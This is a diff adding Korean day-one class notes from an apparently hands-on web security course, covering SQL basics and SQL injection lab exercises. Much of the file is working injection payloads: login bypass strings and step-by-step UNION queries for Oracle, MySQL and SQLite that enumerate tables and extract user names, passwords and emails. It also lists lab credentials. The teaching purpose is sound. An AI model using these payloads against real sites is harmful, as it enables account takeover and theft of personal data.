@@ -1,0 +1,774 @@
+* 1일차 메모
+
+https://seyong.kr <-
+
+1. Oracle DB <- 얘는 안깔아도 될 수도 있음 
+2. SQL Developer - Oracle Client
+ -> 구글 SQL Developer Download 
+
+
+3. Burp Suite (v)
+4. Python - Anaconda, Jupyter Notebook (v)
+  -> 싹 다 지우고 순수하게 Python 
+5. VSCode (v)
+  -> Ctrl + , 파일- 기본설정- 설정 
+
+6. D2Coding, 나눔고딕코딩 - 코딩용 폰트 
+  압축 풀고 -> D2Coding 폴더 들어가서 -> .ttc 컬렉션 파일 우클릭
+  -> 모든 사용자용으로 설치 
+   
+7. OpenJDK - Java <- 
+ -> 구글 Temurin -> Version 21 -> Windows Download
+   
+8. EQST LMS 
+ -> 26aixx -> 26ai00 
+
+=====================================
+
+* SQL Injection 
+
+백엔드에서 처리를 DB랑 연결 <- 쿼리문을 
+
+WAS <-> DB 
+쿼리문 - DB의 명령어 
+검색어 -> 그 검색어로 데이터에 있는것들중에서 꺼내줘 
+
+검색어가 쿼리문으로 작동! 하면 전부다 인젝션!
+=========== <- 내가 입력한게 백엔드에서 실행 되잖아? 
+그래서 내가 DB안의 개인정보 다 털게 <-
+
+엑셀              vs                 DB 
+통합문서 1                         DB이름 
+엑셀 공간                          테이블
+Sheet1                            테이블명, table Name 
+A,B,C,D                            컬럼
+글번호, 제목, 내용...               컬럼명, column Name
+1,2,3,4,5                         Row, Row Num
+
+웹서버 
+                 게시판              로그인                 쿼리
+Create           글쓰기              회원가입               insert  <- 
+Read             글읽기              내 정보조회            select
+Update           글수정              비밀번호 변경          update
+Delete           글삭제              탈퇴                  delete
+
+
+
+1. 왼쪽위에 녹색 + 눌러서
+2. 이름 아무거나
+3. 아이디 : rk?? <- 자기 번호
+4. 비밀번호 : 1234
+5. 호스트 이름 : 192.168.72.40
+6. SID : free
+7. 테스트
+8. 왼쪽아래 상태: 성공! -> 빨간글씨로 
+9. 저장 
+10. Test 옆에 + 누르고 테이블 옆에 + 누르면 아무것도 없는상태
+
+system, sys -> 웹서버를 돌리는 
+시스템 테이블 -> 개인정보 X 
+
+쿼리문 
+1. 중간에 엔터가 들어가도 상관 없다.
+2. ; <- 세미콜론 명령어가 끝난다.
+
+
+주소록 
+-> 친구검색 -> 멍멍일 
+
+select * from friends;
+
+CREATE TABLE friends (
+    name  VARCHAR2(50),   
+    age   NUMBER(3),      
+    addr  VARCHAR2(100),  
+    hobby VARCHAR2(100)   
+);
+
+insert into 테이블 ( 컬럼명1, 컬럼명2,...) values ( 데이터1, 데이터2....);
+
+insert into friends 
+(age, addr, hobby, name) 
+values
+(24, '서울', '축구', '멍멍일');
+
+언어?
+한국
+java - 80% -> 전자정부프레임워크 -> java , spring <- springboot 
+환경 구축 ->  eGov ->자체 제로데이
+php - 15%  배우기 쉽고 환경꾸
+asp - 5% 
+db 50% 오라클, 49% MySQL(MariaDB), 1% MSSQL <- Microsoft Windows 
+-> 문제생기면 사람불러~
+
+
+한창 개발자붐 -> java개발자<- 
+  ubuntu 
+  윈도우서버 유료 -> ms windowserver 2016 <- 지원 X 
+
+     윈도우 서버 IIS <-
+legacy asp(classic asp), .Net 
+   visual basic            c# 
+
+금융권, 증권 너무 오래됐잖아 -> 새로 싹갈아엎어 -> 차세대 프로젝트
+jsp -> springboot -> 기존 코드 갖다 쓰고싶으니까 
+php
+asp
+
+
+오라클 ai 24 free <- enterprise 
+기업 X 
+오라클 13c, 18c <-
+       11
+
+
+insert into friends (name, age, addr, hobby) values('멍멍일','24','서울','축구');
+insert into friends (name, age, addr, hobby) values('멍멍이','25','대구','야구');
+insert into friends (name, age, addr, hobby) values('멍멍삼','26','대전','농구');
+insert into friends (name, age, addr, hobby) values('멍멍사','27','부산','배구');
+insert into friends (name, age, addr, hobby) values('멍멍오','27','부산','축구');
+insert into friends (name, age, addr, hobby) values('멍멍육','28','대전','야구');
+insert into friends (name, age, addr, hobby) values('멍멍칠','27','대전','축구');
+insert into friends (name, age, addr, hobby) values('멍멍팔','26','부산','야구');
+insert into friends (name, age, addr, hobby) values('멍멍구','25','서울','농구');
+insert into friends (name, age, addr, hobby) values('멍멍십','24','서울','배구');
+insert into friends (name, age, addr, hobby) values('야옹일','24','서울','축구');
+insert into friends (name, age, addr, hobby) values('야옹이','23','대구','야구');
+insert into friends (name, age, addr, hobby) values('야옹삼','28','대구','축구');
+insert into friends (name, age, addr, hobby) values('야옹사','29','대구','야구');
+insert into friends (name, age, addr, hobby) values('야옹오','29','대전','농구');
+insert into friends (name, age, addr, hobby) values('야옹육','28','부산','배구');
+insert into friends (name, age, addr, hobby) values('야옹칠','27','대전','축구');
+insert into friends (name, age, addr, hobby) values('야옹팔','26','대구','야구');
+insert into friends (name, age, addr, hobby) values('야옹구','25','대구','야구');
+insert into friends (name, age, addr, hobby) values('야옹십','25','대전','야구');
+
+
+
+테이블명 : members 
+name	userid	password	email
+멍멍일	dog01	1234	dog01@zoo.com
+멍멍이	dog02	1234	dog02@zoo.com
+멍멍삼	dog03	1234	dog03@zoo.com
+멍멍사	dog04	1234	dog04@zoo.com
+멍멍오	dog05	1234	dog05@zoo.com
+멍멍육	dog06	1234	dog06@zoo.com
+멍멍칠	dog07	1234	dog07@zoo.com
+멍멍팔	dog08	1234	dog08@zoo.com
+멍멍구	dog09	1234	dog09@zoo.com
+멍멍십	dog10	1234	dog10@zoo.com
+관리자	admin	rookies1234	admin@zoo.com
+
+
+
+ 제목 [           ]
+ 내용 [           ]
+
+             [등록]
+
+POST test.com/board/write 
+
+title=__제목__&content=__내용___
+
+
+@RequestMapping("/board/write")
+public STring function write(@param title, @param content) {
+    db.conne
+    query = insert into 게시판 ct(192.168.72.20, rk00, 1234, free)(title, content)  values ('__제목__','__내용__';)
+    db.executeQuery(query);
+    return    
+}
+
+  주소록 
+
+  이름 [ 멍멍삼    ]    [검색]
+
+
+select 컬럼들 from friends where name = "___검색어___";
+
+
+* 조회 
+select 컬럼명1, 컬럼명2, ... from 테이블명 where 조건 <-;
+
+where 뒤 조건이 각 row별로 참!을 만족하면 합격시켜서 걔들만 보여주세요.
+
+데이터 저장 숫자 , 문자 가릴필요가 있나?<-
+연산 숫자형 데이터를 사용한다.
+
+'24'+'23'->2423<-
+47
+
+여러개
+이름이 멍멍 들어가고 나이가 25살 위 이거나 집이 대구인사람이고 취미는 야구인사람 
+
+(name like '%멍멍%' and age > 25) or (addr = '대구' and hobby = '야구')
+      F          and   F                     T     and   T 
+             F                                       T
+
+                       F       or   T -> T 
+
+-> and + or 혼합 
+ and: * / 
+ or : + - 
+
+and and and and -> F F 
+
+T and T and F and T -> F 
+이름이 멍멍이고 나이가 25살위이고 집이 대구이고 취미가 야구인 사람 -> 너불합격
+
+
+
+F or F or F -> T
+
+
+2+(3*4)=20(X)
+        14(O)
+
+
+select 컬럼들 from 테이블 wher 컬럼 like '%__검색어__%';
+
+
+
+and ~이고 ~도 
+or  ~거나 ~거나
+True T   False F 
+
+T -> T
+T and F -> F 
+F -> F 
+F and F -> F 
+
+T or T -> T 
+T  -> T 
+F or T -> T 
+F -> F 
+
+and T는 있으나 마나  여러개여도
+or F도 있으나 마나   여러개여도 다 무시된다.
+
+나이가 24살 이거나 취미가 축구
+
+age = 24 or hobby = '축구'
+
+
+24 = 24 or '축구' = '축구' -> 합격
+
+25         '야구'  -> 불합격
+
+select 컬럼들 from 테이블 where 조건들 order by 컬럼명/컬럼번호 (asc)/desc
+
+로그인 -> 
+
+ID [   dog01      ]  admin 
+PW [   1234      ]  몰?루
+
+           [로그인]
+
+test.com/login?id=test&pw=1234
+
+db.connect(192.168.72.20, rk00, 1234, free)
+
+("/login")
+fun login(id, pw) {
+   query = "select * from members where id='__아이디__' and pw='__비번__'"
+   result = db.execute(query)
+   if result == 없어:
+      로그인 실패시켜
+   else :
+      로그인 성공시켜
+
+}
+
+아이디 [admin' or 'q'='w]
+비번   [ㅁ아리ㅓㄴㅁ아러ㅣ]
+
+query = "select * from members where id='admin' or 'q'='w' and pw='ㅁ아리ㅓㄴㅁ아러ㅣ'"
+
+select * from member where userid = 'admin' or 'q'='w' and  password = '몰?루';
+
+   T and F     -> 불합격 
+   T or (T/F and  F)
+            F  -> T 합격 
+
+
+select * from members where id='admin'  --  ' and pw='__비번__'
+
+
+select * from member where id='admin'
+
+ID: z_answer@eqst2.com' or 'as'='qw
+비번: ㅁㄴㅇㄹ
+
+불법 -> 
+
+
+
+====================================
+* SQL Injection Oracle 문제 2번, 3번
+====================================
+- 2번 
+1. 풀이과정
+2. 정답 
+
+- 3번
+1. 풀이과정
+2. 정답
+====================================
+
+1시 30분에 풀이하고 이어서 진행할게요~
+
+
+z_answer@eqst3.com
+몰라
+
+select * from 계정 where 
+id = 'z_answer@eqst3.com' --
+
+z_answer@eqst3.com' --
+
+id = 'z_answer@eqst3.com' or 'a'='b'
+
+아이디 : z_answer@eqst3.com' or 'a'='b
+비번 : 아무거나
+
+
+id: 아이디 
+pw: 비번 
+
+결과 = 'select pw from 계정 
+where id = '__아이디__' '
+
+if __비번__ == 결과:
+    로그인시켜줄게 
+else: 
+    로그인 실패 
+
+Oracle 
+주석 -- /* */
+
+MySQL 
+주석 -- # <-
+
+select lkaad
+insert l.l
+
+* Union SQL Injection
+실무 0.1%? 나올까말까 <-
+
+select name, addr from friends where 
+name like '%멍멍%' 
+
+union 
+
+select addr, hobby from friends where
+name like '%야옹%'
+
+==
+
+select name, addr from friends 
+where name like '%멍멍%' or name like '%야옹%'
+
+select name, addr from friends 
+where age > 25
+union
+select userid, password from member ;
+
+공격이 가능하다!
+한번에 싹 다 털수있음 
+여러개의 column, 여러개의 row를 한꺼번에 탈취
+
+앞 select + 뒤 select 
+union 제약사항
+ 
+1. 앞=뒤 컬럼의 개수 
+
+select name, addr, hobby 
++
+select name, addr 
+
+ORA-01789: 질의 블록은 부정확한 수의 결과 열을 가지고 있습니다.
+
+2. 자료형 (오라클만 깐깐함)
+
+select name, age from friends 
+union
+select name, addr from friends;
+
+ORA-01790: 대응하는 식과 같은 데이터 유형이어야 합니다
+
+주소록 
+
+이름 [  멍멍   ] [검색]
+
+검색어 : 멍멍%' union
+select email,1, userid, password from member where 't%'='t
+
+select name,age,addr,hobby from friends 
+where name like '%멍멍%' union
+select email,1, userid, password from member where 't%'='t%';
+ORA-01790: 대응하는 식과 같은 데이터 유형이어야 합니다
+
+select 'a' from friends;
+
+빈테이블 : dual <-
+
+select 'abc' from dual;
+
+1. 탈취하고 싶은 테이블 이름!
+- 테이블의 정보가 들어있는 테이블 <-
+ all_tables <-
+ user_tables  <-
+
+ user <- 상수, 변수 처럼 
+
+
+select user from dual;
+
+select table_name from all_tables 
+where owner = user ;
+
+select table_name from user_tables;
+
+'MEMBER'
+
+테이블의 정보 : all_tables, user_tables 
+컬럼의 정보 : all_tab_columns, user_tab_columns, cols 
+
+select column_name from cols where table_name = '탈취할 테이블명'
+
+웹사이트에서 합쳐서 보여줘
+union 
+select 탈취한 컬럼명1,2,3 from 탈취한 테이블명 
+
+
+* Union SQL Injection 공격 순서 
+1. 쿼리문 유추 
+  ㅇㅁㄹ %' and or ausidnfo
+
+2. 공격 포인트 
+  이게 쿼리문으로 작동을 할거같애
+
+============================
+
+3. Union 제약사항 
+ 1) 컬럼의 개수 : 몇갠지 알아내야
+   정렬 
+    select 컬럼1,컬럼2... from 주소록 
+    where name like '%__검색어__%' order by 1  -- %'
+
+    검색어 : 멍멍%' order by 1  --
+            멍멍%' order by 2  --
+            멍멍%' order by 3  --
+
+
+    select name,age,addr,hobby from friends
+    where name like '%멍멍%' order by 1 
+     and 'p%'='p %' 
+
+ORA-01785: ORDER BY 항목은 SELECT 목록 식의 수라야 합니다
+
+   빈 데이터 추가 
+   union select null,null,null,null from dual where 'p%'='p   %'
+   자료형 X 
+
+ 2) 자료형 : 숫자,문자.... 위치 알내
+ select name,age,addr,hobby from friends
+
+ union select 1,null,null,null from dual;
+
+
+ORA-01790: 대응하는 식과 같은 데이터 유형이어야 합니다
+
+4. 테이블명 탈취 - 테이블명을 밑에다 붙여서 같이보기 -> account, member, user, ..
+    union select table_name,1,'b','c' from user_tables 
+
+5. 컬럼명 탈취 
+   union select column_name from user_tab_columns where table_name = 'user' 
+
+6. 개인정보 탈취
+   union select 탈취한컬럼명,1,'a','b' from 탈취한 테이블명 
+
+select 컬럼 from 테이블 where 조건 order by where
+
+
+1. 쿼리문 유추 
+select 컬럼들.... from 주소 
+where 읍/면/동 like '%삼성동%' [공격쿼리] %' 
+
+  홍길동's house 
+
+2. 공격 포인트 
+ 에러 유발 syntax error 
+ 검색어 : 삼성동%' [공격쿼리] 'p%'='p
+ 검색어 : 삼성동%' union [공격쿼리] where 'j%'='j 
+  
+
+3. Union 제약 사항 
+ 1) 컬럼의 개수 : 5개 
+   order by 1 <- 컬럼이 무조건 한개는 
+
+   검색어 : 삼성동%' [공격쿼리] --
+   검색어 : 삼성동%' order by 1 --
+  빈 데이터 합치기 
+
+   검색어 : 삼성동%' union select null,null,null,null,null from dual where 'j%'='j 
+
+ 2) 자료형 : 전부 문자형 
+   검색어 : 삼성동%' union select null,null,null,null,null from dual where 'j%'='j 
+    검색어 : 삼성동%' union select 'a','b','c','d','e' from dual where 'j%'='j 
+
+4. 테이블명 : MEMBER 
+검색어 : 삼성동%' union [공격쿼리] where 'j%'='j 
+
+ select table_name,'','','','' from user_tables 
+
+검색어 : 삼성동%' union select table_name,'','','','' from user_tables where 'j%'='j 
+
+5. MEMBER테이블의 컬럼 : email, login_id, pass, user_nm
+ select column_name,'','','','' from cols where table_name = 'MEMBER'
+ 
+ 검색어 : 삼성동%' union [공격쿼리] where 'j%'='j 
+ 검색어 : 삼성동%' union select column_name,'','','','' from cols where table_name = 'MEMBER' where 'j%'='j 
+
+삼성동%' union select column_name,'','','','' from cols where table_name = 'MEMBER' and 'j%'='j
+
+가림
+ 'a'='A'
+ select * from member
+대소문자 안가림
+select * from friends
+select * from FRIENDS 
+SELECT * FROM frieNDS
+
+6. 개인정보 탈취 
+select user_nm, login_id, pass, email,'' from member 
+
+ 검색어 : 삼성동%' union [공격쿼리] where 'j%'='j 
+  검색어 : 삼성동%' union select user_nm, login_id, pass, email,'' from member  where 'j%'='j 
+
+===================================
+* SQL Injection Oracle 문제 10번
+===================================
+1. 풀이 과정
+2. 정답
+===================================
+
+#### 4시 풀이 진행하고
+#### Oracle vs MySQL 차이점들 
+
+===================================
+* SQL Injection MySQL 문제 10번   # 5시 풀이 진행~
+===================================
+1. 풀이 과정
+2. 정답
+===================================
+
+1. 쿼리문 유추 
+select 컬럼들 from 우편번호
+where 읍면동 like '%__검색어__%'
+
+2. 공격포인트 
+검색어: 삼성동%' [공격구문] --%'
+
+3. Union 제약사항 
+ 1-1) 컬럼의 개수: 5개 
+ 검색어: 삼성동%' order by 1 --
+ 1-2) union select null from dual where 'k%'='k
+
+검색어: 삼성동%' [공격구문] %'
+검색어: 삼성동%' union select null,null,null,null,null from dual where 'k%'='k
+ 2) 자료형: 전부 문자형 
+검색어: 삼성동%' union select 1,'b','c','d','e' from dual where 'k%'='k
+
+
+삼성동%' union select null,null,null,null,null --
+
+4. 탈취하고싶은 정보가 들어있는 테이블 컬럼
+  select table_name from user_tables; 
+  select column_name from user_tab_columns;
+
+  ANSWER_COLUMN, REG_ACT_ID, UDP_ID
+
+  create table union_answer(
+    ANSWER_COLUMN varchar2(50),
+    REG_ACCT_ID date날짜형<-
+  )
+  날짜형->문자형으로 바꿔주는 작업
+  to_char(reg_acct_id,'YYYY-MM-DD')
+
+  삼성동%' union select table_name, column_name, data_type, '','' from cols where 'j%'='j
+  
+5. 정답 
+
+  union select ANSWER_COLUMN,'','','','' from SQL_UNION_ANSWER where 'kk%'='kk
+
+검색어: 삼성동%' [공격구문]
+검색어: 삼성동%' union select ANSWER_COLUMN,'','','','' from SQL_UNION_ANSWER where 'kk%'='kk
+
+
+  union select table_name, column_name, '','','' from user_tab_columns; 
+
+검색어: 삼성동%' [공격구문] %'
+검색어: 삼성동%' union select table_name, column_name, '','','' from user_tab_columns where 'q%'='q
+ 
+update <- 비밀번호 변경 메뉴 인젝션 
+운영서버에 실수로 뭐 잘못 넣으면
+난리가
+조회-> select문 유추
+
+sqlmap <- 인젝션 무차별 대입 도구
+
+
+
+
+* Oracle         VS     MySQL(MariaDB)
+주석  --  /* */         -- /* */   #
+테이블  all_tables           information_schema.tables
+        user_tables                 X
+     all_tables where owner=user      
+     information_scheam.tables where table_schema = database()
+
+컬럼   all_tab_columns        information_schema.columns 
+      user_tab_columns, cols      X 
+
+빈테이블/문법까칠 select 컬럼 from dual            , select 뭐 .
+
+
+select user from dual;
+
+select database() from dual;
+
+
+
+웹 SQL 테스트 사이트
+
+sqlfiddle 
+sqltest 
+
+학생성적표
+select 이름,국어점수,영어점수.... from  점수 
+
+select table_name from user_tables
+테이블명 -> 숫자로 -> 문자로 
+      바꾸기 위한 방법 
+  문자->숫자->문자로
+
+* 과제 올리실 때 txt <- 
+
+==================================
+* Union SQL Injection SQLite
+==================================
+
+http://192.168.72.40:5000/
+관리자의 아이디와 비밀번호를 탈취하세요.
+
+1. 풀이과정
+2. 관리자 ID / 비밀번호
+==================================
+
+#################################
+            명예의 전당
+#################################
+          [   손성민   ]
+          [   이지후   ]
+          [   오준서   ]
+          [   추시현   ]
+          [   이윤지   ]                 
+          [   정하은   ]             
+          [   손민성   ]          
+          [   김수민   ]          
+          [   유주현   ]          
+          [   박종원   ]          
+
+옆사람이랑 어사 
+-> MSSQL 9번 제출 안하셔도 됩니다.
+Oracle vs MySQL vs SQLite vs MSSQL
+
+
+* Mysql 10번 
+
+1. 쿼리문 유추  
+ select 컬럼들 from 테이블 
+ where 읍면동 like '%__검색어__%' 
+
+2. 공격포인트 
+ ' -> 들어있는 주소가 없나?
+ ' -> 에러가 났나?
+
+ select 컬럼들 from 테이블 
+ where 읍면동 like '%삼성동%' or '123'='456%'
+
+  or 항상 거짓 
+  and 항상 참 
+
+검색어 : 삼성동%' [공격쿼리]  -> %'
+
+3. Union 제약사항
+ 1) 컬럼의 개수: 5개 
+    order by 1--
+
+검색어 : 삼성동%' [공격쿼리]  -> %'
+검색어 : 삼성동%' order by 1#
+
+    select null,n.....
+
+ 2) 자료형: 자료형 안가림 완전히 아무거나는 아님
+   union select null,null,null,null,null where 'm%'='m
+   
+   검색어 : 삼성동%' [공격쿼리]
+   검색어 : 삼성동%' union select 1,'b',null,null,null from dual where 'm%'='m
+
+4. 테이블명 : member, union_answer
+   select table_name from information_schema.tables 
+
+   union select table_name,0,0,0,0 from information_schema.tables 
+
+   검색어 : 삼성동%' [공격쿼리]
+   검색어 : 삼성동%' union select table_name,0,0,0,0 from information_schema.tables where table_schema = database() and 'k%'='k
+
+5. 컬럼명: LOGIN_ID, USER_NM, EMAIL, PASS
+  select column_name from information_schema.columns where table_name = 'member'
+
+  union select column_name,0,0,0,0 from information_schema.columns where table_name = 'member' and 'n%'='n
+
+    검색어 : 삼성동%' union select column_name,0,0,0,0 from information_schema.columns where table_name = 'member' and 'n%'='n
+
+6. 개인정보 탈취 
+ union select user_nm, login_id, email, pass, 0 from member where 'n%'='n
+
+ 검색어 : 삼성동%' [공격쿼리]
+ 검색어 : 삼성동%' union select user_nm, login_id, email, pass, 0 from member where 'n%'='n
+
+
+sqlite 
+
+vs 테이블정보?
+
+
+select sql from sqlite_master  
+
+1. 쿼리문 유추 
+select 이름, 점수, 지역, 취미, 나이 from 친구들 where 이름 like '%__검색어__%'
+
+2. 공격 포인트 
+검색어: 일%' [공격쿼리] 
+
+3. Union 제약사항 
+ 1) 컬럼 수: 5개
+
+ union select null,null,null,null,null from dual where 'k%'='k
+
+검색어: 일%' [공격쿼리] 
+검색어: 일%' union select null,null,null,null,null where 'k%'='k
+
+ 2) 안가림
+
+4. 테이블&컬럼 
+  union select sql,0,0,0,0 from sqlite_master 
+검색어: 일%' [공격쿼리] 
+검색어: 일%' union select type,name,tbl_name,rootpage,sql from sqlite_master where 'p%'='p 
+
+5. 데이터 :
+ 일%' union select idx, id, name, password, 0 from member where 'z%'='z
+
+ admin	관리자	passw0rd
